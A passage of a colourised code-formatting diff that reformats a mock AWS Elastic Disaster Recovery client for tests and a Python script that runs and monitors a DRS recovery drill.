errors based on error_rate.\"\"\"\n         if self.simulate_errors and self.error_rate > 0:\n             import random\n\u001b[32m+\u001b[0m\n             if random.random() < self.error_rate:\n\u001b[31m-                raise ServiceUnavailableException(\"Service temporarily unavailable\")\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+                raise ServiceUnavailableException(\u001b[0m\n\u001b[32m+                    \"Service temporarily unavailable\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n     def describe_source_servers(\n         self,\n         filters: Optional[Dict[str, List[str]]] = None,\n         maxResults: int = 200,\n\u001b[31m-        nextToken: Optional[str] = None\u001b[0m\n\u001b[32m+        nextToken: Optional[str] = None,\u001b[0m\n     ) -> Dict[str, Any]:\n         \"\"\"\n         Mock describe_source_servers API call.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             filters: Filter by sourceServerIDs or other criteria\n             maxResults: Maximum number of results to return\n             nextToken: Pagination token\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         Returns:\n             Dictionary with 'items' list of source servers\n         \"\"\"\n         self._check_throttling()\n         self._check_random_error()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Filter servers if requested\n         if filters and \"sourceServerIDs\" in filters:\n             server_ids = filters[\"sourceServerIDs\"]\n             items = [\n                 self.source_servers[sid]\n                 for sid in server_ids\n                 if sid in self.source_servers\n             ]\n         else:\n             items = list(self.source_servers.values())\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Apply pagination\n         items = items[:maxResults]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         return {\n             \"items\": items,\n\u001b[31m-            \"nextToken\": None  # Simplified: no pagination in mock\u001b[0m\n\u001b[32m+            \"nextToken\": None,  # Simplified: no pagination in mock\u001b[0m\n         }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def start_recovery(\n         self,\n         sourceServers: List[Dict[str, str]],\n         isDrill: bool = False,\n\u001b[31m-        tags: Optional[Dict[str, str]] = None\u001b[0m\n\u001b[32m+        tags: Optional[Dict[str, str]] = None,\u001b[0m\n     ) -> Dict[str, Any]:\n         \"\"\"\n         Mock start_recovery API call.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             sourceServers: List of source servers to recover\n             isDrill: Whether this is a drill (non-disruptive test)\n             tags: Tags to apply to recovery job\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         Returns:\n             Dictionary with recovery job information\n         \"\"\"\n         self._check_throttling()\n         self._check_random_error()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Validate source servers exist\n         for server in sourceServers:\n             server_id = server.get(\"sourceServerID\")\n             recovery_snapshot_id = server.get(\"recoverySnapshotID\", \"LATEST\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             if server_id not in self.source_servers:\n                 raise ResourceNotFoundException(\n                     f\"Source server not found: {server_id}\"\n                 )\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             if recovery_snapshot_id != \"LATEST\":\n                 # In real DRS, you can specify snapshot IDs\n                 # For mock, we only support LATEST\n                 pass\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Generate job ID\n         job_id = f\"job-{uuid.uuid4().hex[:16]}\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Create recovery job\n         job = {\n             \"jobID\": job_id,\n             \"arn\": f\"arn:aws:drs:us-east-1:123456789012:job/{job_id}\",\n             \"type\": \"LAUNCH\" if not isDrill else \"DRILL\",\n\u001b[36m@@ -216,186 +223,190 @@\u001b[0m\n             \"status\": \"PENDING\",\n             \"participatingServers\": [\n                 {\n                     \"sourceServerID\": server[\"sourceServerID\"],\n                     \"recoveryInstanceID\": None,\n\u001b[31m-                    \"launchStatus\": \"PENDING\"\u001b[0m\n\u001b[32m+                    \"launchStatus\": \"PENDING\",\u001b[0m\n                 }\n                 for server in sourceServers\n             ],\n\u001b[31m-            \"tags\": tags or {}\u001b[0m\n\u001b[32m+            \"tags\": tags or {},\u001b[0m\n         }\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         self.recovery_jobs[job_id] = job\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Schedule status transitions (simulated)\n         self._schedule_job_transitions(job_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         return {\"job\": job}\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _schedule_job_transitions(self, job_id: str):\n         \"\"\"\n         Simulate job status transitions over time.\n         In real implementation, this would happen asynchronously.\n         For testing, we'll track transition times.\n         \"\"\"\n         job = self.recovery_jobs[job_id]\n\u001b[31m-        creation_time = datetime.fromisoformat(job[\"creationDateTime\"].replace(\"Z\", \"\"))\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        creation_time = datetime.fromisoformat(\u001b[0m\n\u001b[32m+            job[\"creationDateTime\"].replace(\"Z\", \"\")\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Store transition schedule\n         job[\"_transitions\"] = {\n             \"in_progress_at\": creation_time + timedelta(seconds=5),\n\u001b[31m-            \"completed_at\": creation_time + timedelta(seconds=30)\u001b[0m\n\u001b[32m+            \"completed_at\": creation_time + timedelta(seconds=30),\u001b[0m\n         }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def describe_jobs(\n         self,\n         filters: Optional[Dict[str, List[str]]] = None,\n         maxResults: int = 200,\n\u001b[31m-        nextToken: Optional[str] = None\u001b[0m\n\u001b[32m+        nextToken: Optional[str] = None,\u001b[0m\n     ) -> Dict[str, Any]:\n         \"\"\"\n         Mock describe_jobs API call.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             filters: Filter by jobIDs or other criteria\n             maxResults: Maximum number of results\n             nextToken: Pagination token\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         Returns:\n             Dictionary with 'items' list of jobs\n         \"\"\"\n         self._check_throttling()\n         self._check_random_error()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Update job statuses based on time\n         self._update_job_statuses()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Filter jobs if requested\n         if filters and \"jobIDs\" in filters:\n             job_ids = filters[\"jobIDs\"]\n             items = [\n                 self.recovery_jobs[jid]\n                 for jid in job_ids\n                 if jid in self.recovery_jobs\n             ]\n         else:\n             items = list(self.recovery_jobs.values())\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Remove internal fields\n         items = [\n             {k: v for k, v in job.items() if not k.startswith(\"_\")}\n             for job in items\n         ]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Apply pagination\n         items = items[:maxResults]\n\u001b[31m-        \u001b[0m\n\u001b[31m-        return {\u001b[0m\n\u001b[31m-            \"items\": items,\u001b[0m\n\u001b[31m-            \"nextToken\": None\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        return {\"items\": items, \"nextToken\": None}\u001b[0m\n\u001b[32m+\u001b[0m\n     def _update_job_statuses(self):\n         \"\"\"Update job statuses based on elapsed time.\"\"\"\n         now = datetime.utcnow()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for job_id, job in self.recovery_jobs.items():\n             if \"_transitions\" not in job:\n                 continue\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             transitions = job[\"_transitions\"]\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Transition to IN_PROGRESS\n\u001b[31m-            if (job[\"status\"] == \"PENDING\" and \u001b[0m\n\u001b[31m-                now >= transitions[\"in_progress_at\"]):\u001b[0m\n\u001b[32m+            if (\u001b[0m\n\u001b[32m+                job[\"status\"] == \"PENDING\"\u001b[0m\n\u001b[32m+                and now >= transitions[\"in_progress_at\"]\u001b[0m\n\u001b[32m+            ):\u001b[0m\n                 job[\"status\"] = \"IN_PROGRESS\"\n                 for server in job[\"participatingServers\"]:\n                     server[\"launchStatus\"] = \"IN_PROGRESS\"\n                     # Generate mock recovery instance ID\n                     server[\"recoveryInstanceID\"] = f\"i-{uuid.uuid4().hex[:17]}\"\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Transition to COMPLETED\n\u001b[31m-            if (job[\"status\"] == \"IN_PROGRESS\" and \u001b[0m\n\u001b[31m-                now >= transitions[\"completed_at\"]):\u001b[0m\n\u001b[32m+            if (\u001b[0m\n\u001b[32m+                job[\"status\"] == \"IN_PROGRESS\"\u001b[0m\n\u001b[32m+                and now >= transitions[\"completed_at\"]\u001b[0m\n\u001b[32m+            ):\u001b[0m\n                 job[\"status\"] = \"COMPLETED\"\n                 job[\"endDateTime\"] = now.isoformat() + \"Z\"\n                 for server in job[\"participatingServers\"]:\n                     server[\"launchStatus\"] = \"LAUNCHED\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def terminate_recovery_instances(\n\u001b[31m-        self,\u001b[0m\n\u001b[31m-        recoveryInstanceIDs: List[str]\u001b[0m\n\u001b[32m+        self, recoveryInstanceIDs: List[str]\u001b[0m\n     ) -> Dict[str, Any]:\n         \"\"\"\n         Mock terminate_recovery_instances API call.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             recoveryInstanceIDs: List of recovery instance IDs to terminate\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         Returns:\n             Dictionary with termination job information\n         \"\"\"\n         self._check_throttling()\n         self._check_random_error()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         job_id = f\"job-{uuid.uuid4().hex[:16]}\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         job = {\n             \"jobID\": job_id,\n             \"type\": \"TERMINATE_RECOVERY_INSTANCES\",\n             \"status\": \"COMPLETED\",\n             \"creationDateTime\": datetime.utcnow().isoformat() + \"Z\",\n\u001b[31m-            \"endDateTime\": datetime.utcnow().isoformat() + \"Z\"\u001b[0m\n\u001b[32m+            \"endDateTime\": datetime.utcnow().isoformat() + \"Z\",\u001b[0m\n         }\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         self.recovery_jobs[job_id] = job\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         return {\"job\": job}\n\u001b[31m-    \u001b[0m\n\u001b[31m-    def add_source_server(self, server_id: str, server_data: Optional[Dict[str, Any]] = None):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def add_source_server(\u001b[0m\n\u001b[32m+        self, server_id: str, server_data: Optional[Dict[str, Any]] = None\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"\n         Add a source server to the mock (for testing).\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             server_id: Source server ID\n             server_data: Optional server data (will use defaults if not provided)\n         \"\"\"\n         if server_data:\n             self.source_servers[server_id] = server_data\n         else:\n             self.source_servers[server_id] = {\n                 \"sourceServerID\": server_id,\n                 \"arn\": f\"arn:aws:drs:us-east-1:123456789012:source-server/{server_id}\",\n\u001b[31m-                \"dataReplicationInfo\": {\u001b[0m\n\u001b[31m-                    \"dataReplicationState\": \"CONTINUOUS\"\u001b[0m\n\u001b[31m-                },\u001b[0m\n\u001b[31m-                \"lastLaunchResult\": \"NOT_STARTED\"\u001b[0m\n\u001b[32m+                \"dataReplicationInfo\": {\"dataReplicationState\": \"CONTINUOUS\"},\u001b[0m\n\u001b[32m+                \"lastLaunchResult\": \"NOT_STARTED\",\u001b[0m\n             }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def remove_source_server(self, server_id: str):\n         \"\"\"Remove a source server from the mock (for testing).\"\"\"\n         if server_id in self.source_servers:\n             del self.source_servers[server_id]\n\u001b[31m-    \u001b[0m\n\u001b[31m-    def simulate_job_failure(self, job_id: str, error_message: str = \"Recovery failed\"):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def simulate_job_failure(\u001b[0m\n\u001b[32m+        self, job_id: str, error_message: str = \"Recovery failed\"\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"\n         Simulate a job failure (for testing error scenarios).\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             job_id: Job ID to fail\n             error_message: Error message to set\n         \"\"\"\n         if job_id in self.recovery_jobs:\n             job = self.recovery_jobs[job_id]\n             job[\"status\"] = \"FAILED\"\n             job[\"endDateTime\"] = datetime.utcnow().isoformat() + \"Z\"\n             job[\"statusMessage\"] = error_message\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             for server in job[\"participatingServers\"]:\n                 server[\"launchStatus\"] = \"FAILED\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def reset(self):\n         \"\"\"Reset mock state (for testing).\"\"\"\n         self.call_count = 0\n         self.recovery_jobs.clear()\n         self.source_servers.clear()\n\u001b[36m@@ -403,13 +414,13 @@\u001b[0m\n \n \n def create_mock_drs_client(**kwargs) -> MockDRSClient:\n     \"\"\"\n     Factory function to create a mock DRS client.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Args:\n         **kwargs: Arguments to pass to MockDRSClient constructor\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     Returns:\n         MockDRSClient instance\n     \"\"\"\n     return MockDRSClient(**kwargs)\n\u001b[1m--- tests/python/standalone_drs_drill.py\t2025-11-30 05:34:16.023758+00:00\u001b[0m\n\u001b[1m+++ tests/python/standalone_drs_drill.py\t2026-01-02 15:49:03.581392+00:00\u001b[0m\n\u001b[36m@@ -3,262 +3,304 @@\u001b[0m\n import json\n import time\n from datetime import datetime\n from botocore.exceptions import ClientError\n \n\u001b[32m+\u001b[0m\n def run_drs_drill(source_server_id=\"s-3c1730a9e0771ea14\", region=\"us-east-1\"):\n     \"\"\"\n     Run a disaster recovery drill using AWS DRS for the specified source server\n     \"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Initialize AWS DRS client\n\u001b[31m-    drs_client = boto3.client('drs', region_name=region)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    drs_client = boto3.client(\"drs\", region_name=region)\u001b[0m\n\u001b[32m+\u001b[0m\n     try:\n         print(f\"=== AWS DRS Drill for Source Server: {source_server_id} ===\")\n         print(f\"Region: {region}\")\n         print(f\"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\")\n         print(\"=\" * 60)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Step 1: Get source server information\n         print(\"Step 1: Retrieving source server information...\")\n         server_info = get_source_server_info(drs_client, source_server_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         if not server_info:\n\u001b[31m-            print(f\"Error: Source server {source_server_id} not found or not accessible\")\u001b[0m\n\u001b[32m+            print(\u001b[0m\n\u001b[32m+                f\"Error: Source server {source_server_id} not found or not accessible\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             return None\n\u001b[31m-            \u001b[0m\n\u001b[31m-        print(f\"Source Server found: {server_info['sourceProperties']['identificationHints']['hostname']}\")\u001b[0m\n\u001b[31m-        print(f\"Replication Status: {server_info['dataReplicationInfo']['dataReplicationState']}\")\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"Source Server found: {server_info['sourceProperties']['identificationHints']['hostname']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"Replication Status: {server_info['dataReplicationInfo']['dataReplicationState']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Step 2: Get available recovery snapshots\n         print(\"\\nStep 2: Finding available recovery snapshots...\")\n         snapshots = get_recovery_snapshots(drs_client, source_server_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         if snapshots:\n             latest_snapshot = snapshots[0]  # Most recent snapshot\n             print(f\"Latest snapshot: {latest_snapshot['snapshotID']}\")\n             print(f\"Snapshot timestamp: {latest_snapshot['timestamp']}\")\n         else:\n\u001b[31m-            print(\"No recovery snapshots found. Will use latest data with on-demand snapshot.\")\u001b[0m\n\u001b[32m+            print(\u001b[0m\n\u001b[32m+                \"No recovery snapshots found. Will use latest data with on-demand snapshot.\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             latest_snapshot = None\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Step 3: Start the recovery drill\n         print(\"\\nStep 3: Starting recovery drill...\")\n\u001b[31m-        drill_job = start_recovery_drill(drs_client, source_server_id, latest_snapshot)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        drill_job = start_recovery_drill(\u001b[0m\n\u001b[32m+            drs_client, source_server_id, latest_snapshot\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         if not drill_job:\n             print(\"Failed to start recovery drill\")\n             return None\n\u001b[31m-            \u001b[0m\n\u001b[31m-        job_id = drill_job['jobID']\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        job_id = drill_job[\"jobID\"]\u001b[0m\n         print(f\"Drill job started successfully!\")\n         print(f\"Job ID: {job_id}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Step 4: Monitor the drill progress\n         print(\"\\nStep 4: Monitoring drill progress...\")\n\u001b[31m-        recovery_instance = monitor_drill_progress(drs_client, job_id, source_server_id)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        recovery_instance = monitor_drill_progress(\u001b[0m\n\u001b[32m+            drs_client, job_id, source_server_id\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         if recovery_instance:\n             print(f\"\\nDrill completed successfully!\")\n\u001b[31m-            print(f\"Recovery Instance ID: {recovery_instance['recoveryInstanceID']}\")\u001b[0m\n\u001b[32m+            print(\u001b[0m\n\u001b[32m+                f\"Recovery Instance ID: {recovery_instance['recoveryInstanceID']}\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             print(f\"EC2 Instance ID: {recovery_instance['ec2InstanceID']}\")\n\u001b[31m-            print(f\"EC2 Instance State: {recovery_instance['ec2InstanceState']}\")\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            print(\u001b[0m\n\u001b[32m+                f\"EC2 Instance State: {recovery_instance['ec2InstanceState']}\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n             # Step 5: Provide cleanup instructions\n\u001b[31m-            print_cleanup_instructions(recovery_instance['recoveryInstanceID'])\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            print_cleanup_instructions(recovery_instance[\"recoveryInstanceID\"])\u001b[0m\n\u001b[32m+\u001b[0m\n             return {\n\u001b[31m-                'job_id': job_id,\u001b[0m\n\u001b[31m-                'recovery_instance_id': recovery_instance['recoveryInstanceID'],\u001b[0m\n\u001b[31m-                'ec2_instance_id': recovery_instance['ec2InstanceID']\u001b[0m\n\u001b[32m+                \"job_id\": job_id,\u001b[0m\n\u001b[32m+                \"recovery_instance_id\": recovery_instance[\u001b[0m\n\u001b[32m+                    \"recoveryInstanceID\"\u001b[0m\n\u001b[32m+                ],\u001b[0m\n\u001b[32m+                \"ec2_instance_id\": recovery_instance[\"ec2InstanceID\"],\u001b[0m\n             }\n         else:\n             print(\"Drill failed or timed out\")\n             return None\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n     except ClientError as e:\n         print(f\"AWS API Error: {e}\")\n         return None\n     except Exception as e:\n         print(f\"Unexpected error: {e}\")\n         import traceback\n\u001b[32m+\u001b[0m\n         traceback.print_exc()\n         return None\n \n\u001b[32m+\u001b[0m\n def get_source_server_info(drs_client, source_server_id):\n     \"\"\"\n     Get information about the source server\n     \"\"\"\n     try:\n         response = drs_client.describe_source_servers(\n\u001b[31m-            filters={\u001b[0m\n\u001b[31m-                'sourceServerIDs': [source_server_id]\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        if response['items']:\u001b[0m\n\u001b[31m-            return response['items'][0]\u001b[0m\n\u001b[32m+            filters={\"sourceServerIDs\": [source_server_id]}\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        if response[\"items\"]:\u001b[0m\n\u001b[32m+            return response[\"items\"][0]\u001b[0m\n         else:\n             return None\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n     except ClientError as e:\n         print(f\"Error retrieving source server info: {e}\")\n         return None\n \n\u001b[32m+\u001b[0m\n def get_recovery_snapshots(drs_client, source_server_id):\n     \"\"\"\n     Get available recovery snapshots for the source server\n     \"\"\"\n     try:\n         response = drs_client.describe_recovery_snapshots(\n             sourceServerID=source_server_id\n         )\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Filter to only completed snapshots (with timestamp)\n\u001b[31m-        completed_snapshots = [s for s in response['items'] if 'timestamp' in s]\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        completed_snapshots = [\u001b[0m\n\u001b[32m+            s for s in response[\"items\"] if \"timestamp\" in s\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+\u001b[0m\n         # Sort by timestamp (most recent first)\n\u001b[31m-        snapshots = sorted(completed_snapshots, \u001b[0m\n\u001b[31m-                         key=lambda x: x['timestamp'], \u001b[0m\n\u001b[31m-                         reverse=True)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        snapshots = sorted(\u001b[0m\n\u001b[32m+            completed_snapshots, key=lambda x: x[\"timestamp\"], reverse=True\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         return snapshots\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     except ClientError as e:\n         print(f\"Error retrieving recovery snapshots: {e}\")\n         return []\n \n\u001b[32m+\u001b[0m\n def start_recovery_drill(drs_client, source_server_id, recovery_snapshot=None):\n     \"\"\"\n     Start the recovery drill\n     \"\"\"\n     try:\n         # Prepare source server configuration\n\u001b[31m-        source_server_config = {\u001b[0m\n\u001b[31m-            'sourceServerID': source_server_id\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        source_server_config = {\"sourceServerID\": source_server_id}\u001b[0m\n\u001b[32m+\u001b[0m\n         # Add recovery snapshot if available\n         if recovery_snapshot:\n\u001b[31m-            source_server_config['recoverySnapshotID'] = recovery_snapshot['snapshotID']\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            source_server_config[\"recoverySnapshotID\"] = recovery_snapshot[\u001b[0m\n\u001b[32m+                \"snapshotID\"\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+\u001b[0m\n         # Start the recovery drill\n         response = drs_client.start_recovery(\n             sourceServers=[source_server_config],\n             isDrill=True,  # This is the key parameter for drill mode\n             tags={\n\u001b[31m-                'DrillType': 'Automated',\u001b[0m\n\u001b[31m-                'Timestamp': datetime.now().strftime('%Y-%m-%d_%H-%M-%S'),\u001b[0m\n\u001b[31m-                'SourceServer': source_server_id\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        return response['job']\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+                \"DrillType\": \"Automated\",\u001b[0m\n\u001b[32m+                \"Timestamp\": datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\"),\u001b[0m\n\u001b[32m+                \"SourceServer\": source_server_id,\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        return response[\"job\"]\u001b[0m\n\u001b[32m+\u001b[0m\n     except ClientError as e:\n         print(f\"Error starting recovery drill: {e}\")\n         return None\n \n\u001b[31m-def monitor_drill_progress(drs_client, job_id, source_server_id, timeout_minutes=30):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+def monitor_drill_progress(\u001b[0m\n\u001b[32m+    drs_client, job_id, source_server_id, timeout_minutes=30\u001b[0m\n\u001b[32m+):\u001b[0m\n     \"\"\"\n     Monitor the drill progress and wait for completion\n     \"\"\"\n     start_time = time.time()\n     timeout_seconds = timeout_minutes * 60\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"Monitoring job {job_id} (timeout: {timeout_minutes} minutes)\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     while time.time() - start_time < timeout_seconds:\n         try:\n             # Check job status\n             job_response = drs_client.describe_jobs(\n\u001b[31m-                filters={\u001b[0m\n\u001b[31m-                    'jobIDs': [job_id]\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[31m-            )\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[31m-            if job_response['items']:\u001b[0m\n\u001b[31m-                job = job_response['items'][0]\u001b[0m\n\u001b[31m-                status = job['status']\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                filters={\"jobIDs\": [job_id]}\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            if job_response[\"items\"]:\u001b[0m\n\u001b[32m+                job = job_response[\"items\"][0]\u001b[0m\n\u001b[32m+                status = job[\"status\"]\u001b[0m\n\u001b[32m+\u001b[0m\n                 elapsed = int(time.time() - start_time)\n                 print(f\"[{elapsed}s] Job status: {status}\")\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 # Check participating servers\n\u001b[31m-                if 'participatingServers' in job:\u001b[0m\n\u001b[31m-                    for server in job['participatingServers']:\u001b[0m\n\u001b[31m-                        launch_status = server.get('launchStatus', 'UNKNOWN')\u001b[0m\n\u001b[31m-                        print(f\"  Server {server['sourceServerID']}: launchStatus={launch_status}\")\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[31m-                if status == 'COMPLETED':\u001b[0m\n\u001b[32m+                if \"participatingServers\" in job:\u001b[0m\n\u001b[32m+                    for server in job[\"participatingServers\"]:\u001b[0m\n\u001b[32m+                        launch_status = server.get(\"launchStatus\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+                        print(\u001b[0m\n\u001b[32m+                            f\"  Server {server['sourceServerID']}: launchStatus={launch_status}\"\u001b[0m\n\u001b[32m+                        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                if status == \"COMPLETED\":\u001b[0m\n                     # Get recovery instance information\n                     print(\"\\nJob completed! Looking for recovery instance...\")\n\u001b[31m-                    recovery_instances = drs_client.describe_recovery_instances(\u001b[0m\n\u001b[31m-                        filters={\u001b[0m\n\u001b[31m-                            'sourceServerIDs': [source_server_id]\u001b[0m\n\u001b[31m-                        }\u001b[0m\n\u001b[32m+                    recovery_instances = (\u001b[0m\n\u001b[32m+                        drs_client.describe_recovery_instances(\u001b[0m\n\u001b[32m+                            filters={\"sourceServerIDs\": [source_server_id]}\u001b[0m\n\u001b[32m+                        )\u001b[0m\n                     )\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n                     # Find the drill instance\n\u001b[31m-                    for instance in recovery_instances['items']:\u001b[0m\n\u001b[31m-                        if instance.get('isDrill', False) and instance.get('jobID') == job_id:\u001b[0m\n\u001b[32m+                    for instance in recovery_instances[\"items\"]:\u001b[0m\n\u001b[32m+                        if (\u001b[0m\n\u001b[32m+                            instance.get(\"isDrill\", False)\u001b[0m\n\u001b[32m+                            and instance.get(\"jobID\") == job_id\u001b[0m\n\u001b[32m+                        ):\u001b[0m\n                             return instance\n\u001b[31m-                    \u001b[0m\n\u001b[31m-                    print(\"Warning: Job completed but no recovery instance found\")\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                    print(\u001b[0m\n\u001b[32m+                        \"Warning: Job completed but no recovery instance found\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n                     return None\n\u001b[31m-                    \u001b[0m\n\u001b[31m-                elif status in ['FAILED', 'TERMINATED']:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                elif status in [\"FAILED\", \"TERMINATED\"]:\u001b[0m\n                     print(f\"Job failed with status: {status}\")\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n                     # Print detailed error if available\n\u001b[31m-                    if 'participatingServers' in job:\u001b[0m\n\u001b[31m-                        for server in job['participatingServers']:\u001b[0m\n\u001b[31m-                            if 'launchStatus' in server and server['launchStatus'] == 'FAILED':\u001b[0m\n\u001b[31m-                                print(f\"Server {server['sourceServerID']} launch failed\")\u001b[0m\n\u001b[31m-                    \u001b[0m\n\u001b[32m+                    if \"participatingServers\" in job:\u001b[0m\n\u001b[32m+                        for server in job[\"participatingServers\"]:\u001b[0m\n\u001b[32m+                            if (\u001b[0m\n\u001b[32m+                                \"launchStatus\" in server\u001b[0m\n\u001b[32m+                                and server[\"launchStatus\"] == \"FAILED\"\u001b[0m\n\u001b[32m+                            